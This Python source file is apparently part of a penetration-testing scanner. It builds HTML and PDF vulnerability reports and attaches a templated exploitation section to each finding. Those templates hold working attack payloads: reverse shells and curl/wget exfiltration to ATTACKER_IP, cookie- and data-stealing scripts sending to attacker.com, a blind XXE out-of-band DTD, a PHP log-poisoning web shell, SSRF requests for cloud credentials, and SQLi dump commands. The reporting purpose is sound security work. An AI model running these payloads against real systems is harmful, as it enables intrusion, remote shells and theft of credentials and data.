"""
Generador de reportes HTML profesionales.
Estilo Acunetix/Burp Suite con dashboard, gráficos y exportación a PDF.
"""

import json
import os
from datetime import datetime
from jinja2 import Template
from core.logger import get_logger
from core.pdf_exporter import PDFExporter
from core.exploitation_resources import get_resources_for_vuln_type


class HTMLReporter:
    """Genera reportes HTML profesionales con dashboard y gráficos."""
    
    def __init__(self, config=None):
        self.config = config or {}
        self.logger = get_logger("html_reporter")
        self.pdf_exporter = PDFExporter()
    
    def generate(self, consolidated_data, output_path, export_pdf=False):
        """
        Genera un reporte HTML profesional.
        
        Args:
            consolidated_data: Dict con los datos del escaneo
            output_path: Ruta donde guardar el HTML
            export_pdf: Si True, también genera un PDF
        """
        try:
            self.logger.info(f"Generando reporte HTML en: {output_path}")
            
            # Cargar template
            template_path = os.path.join(os.path.dirname(__file__), '..', 'templates', 'professional_report.html')
            
            if not os.path.exists(template_path):
                self.logger.error(f"Template no encontrado: {template_path}")
                return False
            
            with open(template_path, 'r', encoding='utf-8') as f:
                template_content = f.read()
            
            template = Template(template_content)
            
            # Preparar datos para el template
            report_data = self._prepare_report_data(consolidated_data)
            
            # Renderizar HTML
            html_content = template.render(**report_data)
            
            # Guardar archivo
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            self.logger.info(f"Reporte HTML generado exitosamente: {output_path}")
            
            # Exportar a PDF si se solicita
            if export_pdf:
                pdf_path = output_path.replace('.html', '.pdf')
                if self.export_to_pdf(output_path, pdf_path):
                    self.logger.info(f"Reporte PDF generado: {pdf_path}")
                else:
                    self.logger.warning("No se pudo generar el PDF")
            
            return True
            
        except Exception as e:
            self.logger.error(f"Error generando reporte HTML: {e}")
            return False
    
    def _prepare_report_data(self, data):
        """Prepara los datos para el template."""
        scan_info = data.get('scan_info', {})
        summary = data.get('summary', {})
        findings = data.get('all_findings', [])
        
        # Enriquecer findings con información de explotación
        enriched_findings = []
        for finding in findings:
            enriched_finding = finding.copy()
            enriched_finding['exploitation'] = self._generate_exploitation_info(finding)
            enriched_findings.append(enriched_finding)
        
        # Calcular estadísticas
        total_findings = len(enriched_findings)
        
        # Agrupar por severidad
        by_severity = {
            'critical': [f for f in enriched_findings if f.get('severity') == 'critical'],
            'high': [f for f in enriched_findings if f.get('severity') == 'high'],
            'medium': [f for f in enriched_findings if f.get('severity') == 'medium'],
            'low': [f for f in enriched_findings if f.get('severity') == 'low'],
            'info': [f for f in enriched_findings if f.get('severity') == 'info']
        }
        
        # Agrupar por tipo
        by_type = {}
        for finding in enriched_findings:
            ftype = finding.get('type', 'unknown')
            if ftype not in by_type:
                by_type[ftype] = []
            by_type[ftype].append(finding)
        
        # Calcular score de riesgo (0-100)
        risk_score = self._calculate_risk_score(summary)
        
        # Timeline (simulado por ahora)
        timeline = self._generate_timeline(scan_info)
        
        return {
            'scan_info': scan_info,
            'summary': summary,
            'findings': enriched_findings,
            'by_severity': by_severity,
            'by_type': by_type,
            'total_findings': total_findings,
            'risk_score': risk_score,
            'timeline': timeline,
            'generated_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
    
    def _get_common_github_resources(self):
        """Retorna recursos comunes de GitHub para todas las vulnerabilidades."""
        return {
            'payloadsallthethings': 'https://github.com/swisskyrepo/PayloadsAllTheThings',
            'hacktricks': 'https://book.hacktricks.xyz',
            'owasp': 'https://cheatsheetseries.owasp.org',
            'portswigger': 'https://portswigger.net/web-security'
        }
    
    def _generate_exploitation_info(self, finding):
        """
        Genera información detallada de explotación para cada vulnerabilidad.
        Incluye POCs personalizados, enlaces a POCs reales en GitHub y herramientas.
        """
        vuln_type = finding.get('type', '').lower()
        evidence = finding.get('evidence', {})
        url = evidence.get('url', finding.get('url', 'http://target.com'))
        param = evidence.get('parameter', evidence.get('param', 'id'))
        payload = evidence.get('payload', '')
        
        exploitation_data = {
            'description': '',
            'steps': [],
            'poc': '',
            'poc_specific': '',  # POC específico para esta vulnerabilidad
            'github_pocs': [],   # Enlaces a POCs en GitHub
            'tools': [],
            'impact': '',
            'references': []     # Referencias adicionales
        }
        
        # Obtener recursos de GitHub y herramientas del módulo externo
        resources = get_resources_for_vuln_type(vuln_type)
        if resources:
            exploitation_data['github_pocs'] = resources.get('github_pocs', [])
            exploitation_data['tools'] = resources.get('tools', [])
        
        # XSS (Cross-Site Scripting)
        if 'xss' in vuln_type:
            exploitation_data['description'] = 'Esta vulnerabilidad XSS permite inyectar código JavaScript malicioso que se ejecutará en el navegador de las víctimas.'
            exploitation_data['steps'] = [
                f'Identificar el parámetro vulnerable: {param}',
                'Probar payloads básicos para confirmar la inyección',
                'Bypassear filtros si existen (encoding, mayúsculas, etc.)',
                'Crear payload final para robar cookies o realizar acciones',
                'Distribuir el enlace malicioso a las víctimas'
            ]
            
            # POC específico para esta vulnerabilidad
            if payload:
                exploitation_data['poc_specific'] = f'''# POC Detectado en el Escaneo
{url}?{param}={payload}

# Verificar en el navegador o con curl:
curl "{url}?{param}={payload}"'''
            
            # POCs genéricos de ejemplo
            exploitation_data['poc'] = f'''# POC Básico - Alerta
{url}?{param}=<script>alert(document.domain)</script>

# POC - Robo de Cookies
{url}?{param}=<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>

# POC - Bypass Filtros Comunes
{url}?{param}=<img src=x onerror=alert(1)>
{url}?{param}=<svg/onload=alert(1)>'''
            
            exploitation_data['impact'] = 'Un atacante puede robar sesiones de usuarios, credenciales, realizar acciones en nombre de la víctima, redirigir a sitios maliciosos, o instalar keyloggers para capturar información sensible.'
        
        # SQL Injection
        elif 'sqli' in vuln_type or 'sql' in vuln_type:
            exploitation_data['description'] = 'Esta vulnerabilidad SQLi permite manipular consultas SQL para extraer, modificar o eliminar datos de la base de datos.'
            exploitation_data['steps'] = [
                f'Identificar el parámetro vulnerable: {param}',
                'Confirmar la inyección con payloads básicos (comillas, OR 1=1)',
                'Determinar el número de columnas (ORDER BY o UNION)',
                'Identificar columnas visibles en la respuesta',
                'Extraer información de la base de datos (tablas, usuarios, datos)',
                'Escalar privilegios si es posible (lectura de archivos, RCE)'
            ]
            
            # POC específico
            if payload:
                exploitation_data['poc_specific'] = f'''# POC Detectado en el Escaneo
{url}?{param}={payload}

# Comando SQLMap para esta vulnerabilidad:
sqlmap -u "{url}?{param}=1" --batch --dbs'''
            
            exploitation_data['poc'] = f'''# POC - Detección Básica
{url}?{param}=1'
{url}?{param}=1' OR '1'='1

# POC - UNION Based
{url}?{param}=1' UNION SELECT NULL,NULL,NULL--
{url}?{param}=1' UNION SELECT 1,username,password FROM users--

# Comando SQLMap
sqlmap -u "{url}?{param}=1" --batch --dbs --tables --dump'''
            
            exploitation_data['impact'] = 'Un atacante puede extraer toda la base de datos incluyendo credenciales, información personal, datos financieros. También puede modificar o eliminar datos, bypassear autenticación, y en algunos casos ejecutar comandos en el servidor.'
        
        # CSRF (Cross-Site Request Forgery)
        elif 'csrf' in vuln_type:
            exploitation_data['description'] = 'Esta vulnerabilidad CSRF permite que un atacante fuerce a usuarios autenticados a realizar acciones no deseadas sin su conocimiento.'
            exploitation_data['steps'] = [
                'Identificar una acción sensible sin protección CSRF (cambio de contraseña, transferencia, etc.)',
                'Capturar la request legítima con Burp Suite',
                'Crear un formulario HTML malicioso que replique la request',
                'Alojar el HTML en un servidor controlado por el atacante',
                'Engañar a la víctima para que visite la página maliciosa mientras está autenticada'
            ]
            exploitation_data['poc'] = f'''<!-- POC - Formulario Auto-Submit -->
<html>
<body>
<h1>¡Has ganado un premio! Cargando...</h1>
<form id="csrf" action="{url}" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="password" value="hacked123">
    <input type="hidden" name="action" value="change_password">
</form>
<script>
    document.getElementById('csrf').submit();
</script>
</body>
</html>

<!-- POC - Con AJAX -->
<script>
fetch('{url}', {{
    method: 'POST',
    credentials: 'include',
    headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
    body: 'email=attacker@evil.com&action=change_email'
}});
</script>

<!-- POC - Con Imagen (GET Request) -->
<img src="{url}?action=delete&id=123" style="display:none">'''
            
            exploitation_data['tools'] = [
                'Burp Suite - Para capturar y analizar requests',
                'CSRF PoC Generator (extensión de Burp) - Genera POCs automáticamente',
                'CSRFTester - Herramienta para testing de CSRF',
                'OWASP ZAP - Incluye detector de CSRF'
            ]
            exploitation_data['impact'] = 'Un atacante puede realizar acciones en nombre de usuarios autenticados como cambiar contraseñas, modificar emails, realizar transferencias, eliminar datos, o cambiar configuraciones de seguridad.'
        
        # LFI (Local File Inclusion)
        elif 'lfi' in vuln_type:
            exploitation_data['description'] = 'Esta vulnerabilidad LFI permite leer archivos arbitrarios del servidor, incluyendo archivos de configuración, logs y código fuente.'
            exploitation_data['steps'] = [
                f'Identificar el parámetro vulnerable: {param}',
                'Probar path traversal básico (../../../etc/passwd)',
                'Bypassear filtros si existen (encoding, null bytes, wrappers)',
                'Leer archivos sensibles del sistema',
                'Intentar escalar a RCE mediante log poisoning o wrappers PHP'
            ]
            exploitation_data['poc'] = f"""# POC - Path Traversal Básico
{url}?{param}=../../../etc/passwd
{url}?{param}=../../../etc/shadow
{url}?{param}=../../../var/www/html/config.php

# POC - Bypass Filtros
{url}?{param}=....//....//....//etc/passwd
{url}?{param}=..%252f..%252f..%252fetc/passwd
{url}?{param}=....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts

# POC - PHP Wrappers
{url}?{param}=php://filter/convert.base64-encode/resource=index.php
{url}?{param}=php://filter/read=string.rot13/resource=config.php
{url}?{param}=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

# POC - Log Poisoning (RCE)
# 1. Envenenar logs con código PHP
curl -A "<?php system($_GET['cmd']); ?>" {url}
# 2. Incluir el log
{url}?{param}=../../../var/log/apache2/access.log&cmd=whoami

# POC - Archivos Sensibles Comunes
{url}?{param}=/etc/passwd
{url}?{param}=/etc/shadow
{url}?{param}=/var/www/html/.env
{url}?{param}=/var/www/html/config.php
{url}?{param}=/proc/self/environ
{url}?{param}=C:\\Windows\\System32\\drivers\\etc\\hosts"""
            
            exploitation_data['tools'] = [
                'LFISuite - Framework automatizado para explotación LFI',
                'Kadimus - Herramienta de detección y explotación LFI/RFI',
                'Burp Suite - Para fuzzing manual de paths',
                'DotDotPwn - Fuzzer de path traversal'
            ]
            exploitation_data['impact'] = 'Un atacante puede leer archivos sensibles como credenciales, configuraciones, código fuente, y claves privadas. En casos avanzados puede escalar a ejecución remota de código (RCE) mediante log poisoning o PHP wrappers.'
        
        # SSRF (Server-Side Request Forgery)
        elif 'ssrf' in vuln_type:
            exploitation_data['description'] = 'Esta vulnerabilidad SSRF permite que un atacante haga que el servidor realice requests a recursos internos o externos arbitrarios.'
            exploitation_data['steps'] = [
                f'Identificar el parámetro que acepta URLs: {param}',
                'Probar acceso a recursos internos (localhost, 127.0.0.1, IPs privadas)',
                'Escanear puertos internos',
                'Acceder a servicios internos (AWS metadata, Redis, etc.)',
                'Intentar bypassear filtros con encoding o IPs alternativas'
            ]
            exploitation_data['poc'] = f'''# POC - Acceso a Localhost
{url}?{param}=http://localhost
{url}?{param}=http://127.0.0.1
{url}?{param}=http://0.0.0.0

# POC - AWS Metadata (Cloud)
{url}?{param}=http://169.254.169.254/latest/meta-data/
{url}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# POC - Port Scanning
{url}?{param}=http://localhost:22
{url}?{param}=http://localhost:3306
{url}?{param}=http://localhost:6379
{url}?{param}=http://localhost:27017

# POC - Bypass Filtros
{url}?{param}=http://127.1
{url}?{param}=http://[::1]
{url}?{param}=http://2130706433 (127.0.0.1 en decimal)
{url}?{param}=http://0x7f.0x0.0x0.0x1 (127.0.0.1 en hex)

# POC - Acceso a Servicios Internos
{url}?{param}=http://localhost:6379 (Redis)
{url}?{param}=gopher://localhost:6379/_SET%20key%20value

# POC - File Protocol
{url}?{param}=file:///etc/passwd
{url}?{param}=file:///c:/windows/system32/drivers/etc/hosts'''
            
            exploitation_data['tools'] = [
                'SSRFmap - Herramienta automática de explotación SSRF',
                'Gopherus - Genera payloads gopher para explotar servicios internos',
                'Burp Suite Collaborator - Para detectar SSRF blind',
                'Interactsh - Servidor para detectar interacciones SSRF'
            ]
            exploitation_data['impact'] = 'Un atacante puede acceder a servicios internos, escanear la red interna, extraer metadata de cloud (AWS, Azure, GCP), acceder a bases de datos internas, y potencialmente ejecutar código en servicios vulnerables.'
        
        # Command Injection
        elif 'cmdi' in vuln_type or 'command' in vuln_type or 'rce' in vuln_type:
            exploitation_data['description'] = 'Esta vulnerabilidad permite ejecutar comandos arbitrarios del sistema operativo en el servidor.'
            exploitation_data['steps'] = [
                f'Identificar el parámetro vulnerable: {param}',
                'Probar inyección básica con separadores de comandos',
                'Confirmar ejecución con comandos simples (whoami, id)',
                'Extraer información del sistema',
                'Establecer reverse shell para acceso completo'
            ]
            # Usar triple comillas dobles y escapar $ correctamente
            exploitation_data['poc'] = f"""# POC - Detección Básica
{url}?{param}=; whoami
{url}?{param}=| whoami
{url}?{param}=` whoami `
{url}?{param}=$( whoami )
{url}?{param}=& whoami &

# POC - Extracción de Información
{url}?{param}=; id
{url}?{param}=; uname -a
{url}?{param}=; cat /etc/passwd
{url}?{param}=; ls -la /var/www/html

# POC - Reverse Shell (Bash)
{url}?{param}=; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
{url}?{param}=; nc ATTACKER_IP 4444 -e /bin/bash

# POC - Reverse Shell (Python)
{url}?{param}=; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# POC - Reverse Shell (PHP)
{url}?{param}=; php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# POC - Exfiltración de Datos
{url}?{param}=; curl http://ATTACKER_IP/?data=$(cat /etc/passwd | base64)
{url}?{param}=; wget --post-file=/etc/passwd http://ATTACKER_IP

# Listener en Atacante
nc -lvnp 4444"""
            
            exploitation_data['tools'] = [
                'Commix - Herramienta automática de detección y explotación de command injection',
                'Netcat - Para establecer reverse shells',
                'Metasploit Framework - Para post-explotación',
                'Burp Suite - Para fuzzing y testing manual'
            ]
            exploitation_data['impact'] = 'Un atacante obtiene ejecución completa de comandos en el servidor, pudiendo leer/modificar archivos, instalar backdoors, pivotar a otros sistemas, robar datos sensibles, o comprometer completamente el servidor.'
        
        # XXE (XML External Entity)
        elif 'xxe' in vuln_type:
            exploitation_data['description'] = 'Esta vulnerabilidad XXE permite procesar entidades externas XML maliciosas para leer archivos, realizar SSRF, o causar DoS.'
            exploitation_data['steps'] = [
                'Identificar endpoint que procesa XML',
                'Inyectar DTD con entidad externa',
                'Leer archivos locales del servidor',
                'Realizar SSRF a servicios internos',
                'Intentar RCE mediante expect:// (si está disponible)'
            ]
            exploitation_data['poc'] = f'''# POC - Lectura de Archivos
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
    <data>&xxe;</data>
</root>

# POC - SSRF Interno
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/admin">]>
<root>
    <data>&xxe;</data>
</root>

# POC - Blind XXE (Out-of-Band)
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER_IP/evil.dtd">%xxe;]>
<root><data>test</data></root>

# evil.dtd en servidor atacante:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER_IP/?data=%file;'>">
%eval;
%exfil;

# POC - XXE con PHP Wrapper
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>
<root>
    <data>&xxe;</data>
</root>

# POC - Billion Laughs (DoS)
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>'''
            
            exploitation_data['tools'] = [
                'XXEinjector - Herramienta automática de explotación XXE',
                'Burp Suite (XXE Scanner) - Para detección y explotación',
                'OWASP ZAP - Incluye scanner de XXE',
                'XML Bomb Generator - Para generar payloads DoS'
            ]
            exploitation_data['impact'] = 'Un atacante puede leer archivos sensibles del servidor, realizar SSRF a servicios internos, causar denegación de servicio (DoS), y en algunos casos ejecutar código remoto.'
        
        # CORS Misconfiguration
        elif 'cors' in vuln_type:
            exploitation_data['description'] = 'Esta mala configuración de CORS permite que sitios maliciosos lean respuestas de la aplicación, incluyendo datos sensibles.'
            exploitation_data['steps'] = [
                'Identificar endpoints con CORS mal configurado',
                'Verificar que Access-Control-Allow-Credentials: true',
                'Crear página HTML maliciosa que haga requests',
                'Engañar a víctima autenticada para visitar la página',
                'Extraer datos sensibles de la respuesta'
            ]
            exploitation_data['poc'] = f"""<!-- POC - Robo de Datos con CORS -->
<html>
<body>
<h1>Cargando contenido...</h1>
<script>
// Hacer request al sitio vulnerable
fetch('{url}/api/user/profile', {{
    method: 'GET',
    credentials: 'include'  // Incluir cookies
}})
.then(response => response.json())
.then(data => {{
    // Exfiltrar datos al servidor del atacante
    fetch('https://attacker.com/steal', {{
        method: 'POST',
        body: JSON.stringify(data)
    }});
    console.log('Datos robados:', data);
}})
.catch(err => console.error(err));
</script>
</body>
</html>

<!-- POC - Con XMLHttpRequest -->
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', '{url}/api/sensitive-data', true);
xhr.withCredentials = true;
xhr.onload = function() {{
    // Enviar datos robados
    var stolen = new XMLHttpRequest();
    stolen.open('POST', 'https://attacker.com/log', true);
    stolen.send(xhr.responseText);
}};
xhr.send();
</script>

# Verificación Manual con curl
curl -H "Origin: https://evil.com" -H "Access-Control-Request-Method: GET" \\
     -H "Access-Control-Request-Headers: X-Requested-With" \\
     -X OPTIONS {url}/api/data -v"""
            
            exploitation_data['tools'] = [
                'Burp Suite - Para analizar headers CORS',
                'CORS Scanner (extensión de Burp) - Detecta misconfigurations',
                'CORScanner - Herramienta automática de análisis CORS',
                'Browser DevTools - Para testing manual'
            ]
            exploitation_data['impact'] = 'Un atacante puede leer datos sensibles de usuarios autenticados, incluyendo información personal, tokens de sesión, datos financieros, o cualquier información accesible por el usuario víctima.'
        
        # Authentication Bypass
        elif 'auth' in vuln_type:
            exploitation_data['description'] = 'Esta vulnerabilidad permite bypassear mecanismos de autenticación y acceder sin credenciales válidas.'
            exploitation_data['steps'] = [
                'Identificar el mecanismo de autenticación',
                'Probar credenciales por defecto o débiles',
                'Intentar SQL injection en login',
                'Probar bypass con manipulación de parámetros',
                'Verificar acceso a recursos protegidos'
            ]
            exploitation_data['poc'] = f'''# POC - SQL Injection en Login
Username: admin' OR '1'='1'--
Password: cualquiera

Username: ' OR 1=1--
Password: ' OR 1=1--

# POC - Manipulación de Parámetros
POST {url}/login
user=admin&password=wrong&admin=true

POST {url}/login
user=admin&password=wrong&role=administrator

# POC - JWT Manipulation
# Token original: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
# Cambiar "alg" a "none"
# Modificar payload: {{"user":"admin","role":"admin"}}

# POC - Session Fixation
# 1. Obtener session ID válido
# 2. Forzar a víctima a usar ese session ID
{url}/login?PHPSESSID=attacker_controlled_session

# POC - Bypass con Headers
GET {url}/admin HTTP/1.1
Host: target.com
X-Original-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1

# POC - Path Traversal en Auth
{url}/admin/../admin
{url}/./admin
{url}/admin/./'''
            
            exploitation_data['tools'] = [
                'Hydra - Para brute force de credenciales',
                'Burp Suite Intruder - Para fuzzing de parámetros',
                'JWT_Tool - Para manipulación de tokens JWT',
                'SQLMap - Para SQLi en formularios de login'
            ]
            exploitation_data['impact'] = 'Un atacante puede acceder a la aplicación sin credenciales válidas, obtener privilegios administrativos, acceder a datos de otros usuarios, o comprometer completamente el sistema de autenticación.'
        
        # Security Headers Missing
        elif 'header' in vuln_type:
            exploitation_data['description'] = 'La ausencia de headers de seguridad deja la aplicación vulnerable a diversos ataques.'
            exploitation_data['steps'] = [
                'Identificar qué headers de seguridad faltan',
                'Determinar el impacto de cada header faltante',
                'Explotar vulnerabilidades relacionadas (XSS, Clickjacking, etc.)',
                'Demostrar el riesgo con POCs específicos'
            ]
            
            missing_headers = evidence.get('missing_headers', [])
            if 'X-Frame-Options' in str(missing_headers) or 'frame' in finding.get('title', '').lower():
                exploitation_data['poc'] = f'''<!-- POC - Clickjacking Attack -->
<html>
<head><title>¡Gana un iPhone gratis!</title></head>
<body>
<h1>¡Haz click aquí para ganar!</h1>
<iframe src="{url}" style="opacity:0.1;position:absolute;top:50px;left:100px;width:500px;height:500px;"></iframe>
<button style="position:absolute;top:200px;left:250px;width:200px;height:50px;z-index:-1;">
    ¡CLICK AQUÍ!
</button>
</body>
</html>

# Verificación
curl -I {url} | grep -i "x-frame-options"'''
            else:
                exploitation_data['poc'] = f'''# Verificar Headers de Seguridad
curl -I {url}

# Headers que deberían estar presentes:
# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# X-XSS-Protection: 1; mode=block
# Strict-Transport-Security: max-age=31536000
# Content-Security-Policy: default-src 'self'
# Referrer-Policy: no-referrer

# Herramienta automatizada
securityheaders.com/?q={url}'''
            
            exploitation_data['tools'] = [
                'SecurityHeaders.com - Análisis online de headers',
                'Mozilla Observatory - Scanner de seguridad web',
                'Burp Suite - Para analizar headers',
                'OWASP ZAP - Incluye análisis de headers'
            ]
            exploitation_data['impact'] = 'Dependiendo del header faltante: Clickjacking (sin X-Frame-Options), XSS (sin CSP), MIME sniffing attacks (sin X-Content-Type-Options), downgrade attacks (sin HSTS), o información leakage (sin Referrer-Policy).'
        
        # Default - Para vulnerabilidades no específicas
        else:
            exploitation_data['description'] = f'Esta vulnerabilidad de tipo {vuln_type} requiere análisis específico para determinar el vector de explotación exacto.'
            exploitation_data['steps'] = [
                'Analizar la naturaleza específica de la vulnerabilidad',
                'Identificar los vectores de ataque posibles',
                'Desarrollar un POC adaptado al contexto',
                'Validar el impacto real en el entorno'
            ]
            exploitation_data['poc'] = f'''# Análisis requerido para {vuln_type}
# URL afectada: {url}
# Parámetro: {param}

# Pasos generales:
1. Interceptar la request con Burp Suite
2. Analizar el comportamiento de la aplicación
3. Probar diferentes payloads según el tipo de vulnerabilidad
4. Documentar el impacto real'''
            
            exploitation_data['tools'] = [
                'Burp Suite Professional - Suite completa de testing',
                'OWASP ZAP - Scanner de seguridad open source',
                'Metasploit Framework - Para explotación avanzada',
                'Nmap - Para reconocimiento y escaneo'
            ]
            exploitation_data['impact'] = 'El impacto depende de la naturaleza específica de la vulnerabilidad y el contexto de la aplicación. Se recomienda análisis detallado.'
        
        return exploitation_data
    
    def _calculate_risk_score(self, summary):
        """Calcula un score de riesgo de 0-100."""
        critical = summary.get('critical', 0)
        high = summary.get('high', 0)
        medium = summary.get('medium', 0)
        low = summary.get('low', 0)
        
        # Ponderación: Critical=40, High=25, Medium=15, Low=5
        score = (critical * 40) + (high * 25) + (medium * 15) + (low * 5)
        
        # Normalizar a 0-100
        max_score = 500  # Asumiendo máximo razonable
        normalized = min(100, (score / max_score) * 100)
        
        return round(normalized, 1)
    
    def _generate_timeline(self, scan_info):
        """Genera timeline del escaneo."""
        timestamp = scan_info.get('timestamp', '')
        
        # Parsear timestamp
        try:
            dt = datetime.strptime(timestamp, '%Y%m%d_%H%M%S')
            start_time = dt.strftime('%H:%M:%S')
        except:
            start_time = '00:00:00'
        
        # Timeline simulado (en producción vendría de logs reales)
        timeline = [
            {'time': start_time, 'event': 'Escaneo iniciado', 'type': 'start'},
            {'time': start_time, 'event': 'Crawling completado', 'type': 'info'},
            {'time': start_time, 'event': 'Fingerprinting completado', 'type': 'info'},
            {'time': start_time, 'event': 'Análisis de vulnerabilidades completado', 'type': 'success'},
            {'time': start_time, 'event': 'Reporte generado', 'type': 'end'}
        ]
        
        return timeline

    def export_to_pdf(self, html_path, pdf_path):
        """
        Exporta el reporte HTML a PDF.
        
        Args:
            html_path: Ruta del archivo HTML
            pdf_path: Ruta donde guardar el PDF
        
        Returns:
            bool: True si la exportación fue exitosa
        """
        if not self.pdf_exporter.is_available():
            self.logger.warning("wkhtmltopdf no está disponible")
            self.logger.info(self.pdf_exporter.get_installation_instructions())
            return False
        
        # Opciones específicas para el reporte
        options = {
            "page-size": "A4",
            "margin-top": "15mm",
            "margin-right": "15mm",
            "margin-bottom": "15mm",
            "margin-left": "15mm",
            "encoding": "UTF-8",
            "enable-local-file-access": None,
            "print-media-type": None,
            "no-stop-slow-scripts": None,
            "javascript-delay": "2000",  # Esperar a que se carguen los gráficos
            "enable-javascript": None
        }
        
        return self.pdf_exporter.export(html_path, pdf_path, options)
